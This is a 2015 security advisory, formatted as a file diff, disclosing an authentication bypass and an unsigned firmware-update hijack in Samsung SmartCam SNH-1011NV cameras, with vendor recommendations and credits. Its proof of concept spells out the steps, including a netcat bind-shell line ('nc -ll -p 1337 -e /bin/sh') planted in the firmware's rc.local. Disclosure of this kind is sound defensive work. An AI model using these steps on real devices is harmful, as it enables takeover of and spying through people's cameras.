@@ -1,0 +1,69 @@
+Sunday, August 23, 2015
+Burlington, Vermont, USA
+
+
+Summary
+
+Samsung SmartCam SNH-1011NV IP cameras, running firmware version 2.12_141027, are vulnerable to an authentication bypass which could enable an attacker to gain complete control of a device by flashing its firmware with attacker-controlled code.
+
+
+Requirements
+
+- The attacker must be able to initiate a TCP connection with the camera over port 80.
+
+
+Details
+
+These cameras authenticate POST requests using the standard PHP session cookie mechanism; however, an attacker can obtain a valid session cookie by making a GET request to a valid URL, with the parameter "login=true" appended. For example, visiting "http://camera-ip/pages/page_setup_wired_network.php?login=true#" would allow an attacker to change the device's network settings.
+
+Additionally, the device contains a firmware update mechanism that is initiated by the administrator clicking a button on "http://camera-ip/pages/page_admin_firmware.php?login=true#". The device then makes an A record request for "www.samsungsmartcam.com" and then attempts to download the file "/firmware/firmware.xml" from the returned host via plaintext HTTP. Depending on the contents of this file, the device may then attempt to download a firmware image, flash itself, and reboot.
+
+
+Recommendations to the vendor
+
+- Make sure that a user cannot obtain a valid session cookie without first entering the correct password.
+- Make sure that the device downloads firmware images over an https: link.
+- Implement a firmware signing program in future products.
+
+
+Recommendations to administrators
+
+- Make sure that the device is not accessible to untrusted networks.
+
+
+Proof of concept
+
+This attack requires a web browser, plus the ability to run a DNS server and a web server.
+
+- In a web browser, the attacker visits "http://camera-ip/pages/page_setup_wired_network.php?login=true#", configures the camera to use a static (non-DHCP) network configuration, and changes the DNS servers to the address of a DNS server which they control.
+
+- On the above-mentioned DNS server, the attacker creates an A record mapping "www.samsungsmartcam.com" to the address of a web server which they control.
+
+- On the web server, the attacker creates a "/firmware" directory, and downloads "http://www.samsungsmartcam.com/firmware/firmware.xml" to this directory. This XML file contains records for different Samsung SmartCam models, like this:
+    <MODEL>
+        <NAME>SNH-1011N</NAME>
+        <MAJOR>2</MAJOR>
+        <MINOR>12</MINOR>
+        <DATE>141027</DATE>
+        <FIRMWARE_FILE>http://www.samsungsmartcam.com/firmware/snh1011.tgz</FIRMWARE_FILE>
+    </MODEL>
+    <MODEL>
+        <NAME>SNH-1011NV</NAME>
+        <MAJOR>2</MAJOR>
+        <MINOR>12</MINOR>
+        <DATE>141027</DATE>
+        <FIRMWARE_FILE>http://www.samsungsmartcam.com/firmware/snh1011nv.tgz</FIRMWARE_FILE>
+    </MODEL>
+For the SNH-1011NV model, the attacker accounts for a bug in the firmware update mechanism by incrementing the minor version and date of the SNH-1011N model by 1.
+- The attacker then downloads the "http://www.samsungsmartcam.com/firmware/snh1011nv.tgz" tarball to the same directory and unpacks it. This is the device's firmware image. It contains a gzipped Linux ramdisk image, "ramdisk_snb5000.dm365.gz", which the attacker unzips and mounts using a Linux PC. The attacker adds the line "nc -ll -p 1337 -e /bin/sh &" to the end of "/etc/rc.d/rc.local" within the ramdisk, which creates a remote backdoor using netcat, and re-packages the firmware as "snh1011nv.tgz".
+- The attacker verifies that they are hosting an A record for "www.samsungsmartcam.com" and that both "/firmware/firmware.xml" and "/firmware/snh1011nv.tgz" are downloadable from their web server.
+- The attacker visits "http://camera-ip/pages/page_admin_firmware.php?login=true#" in a web browser and clicks the "update" button. The camera's front LED will turn purple as it begins to download the modified firmware image from the attacker's web server.
+- When the download completes and the camera reboots, the attacker connects using a command like "nc camera-ip 1337". A shell prompt ("$ " or "# ") will not be visible, but the attacker will be able to run commands like "ls" "cat" and "rm" with root permissions.
+
+
+Credit and contact info
+
+Discovered by Brian Waters (brian@brianmwaters.net)
+PoC developed by Brian Waters, Joseph Cohen (joseph@josephpcohen.com), snakecharmr1024, and others.
+
+Many thanks to the organizers of the DEF CON 23 IoT Village.
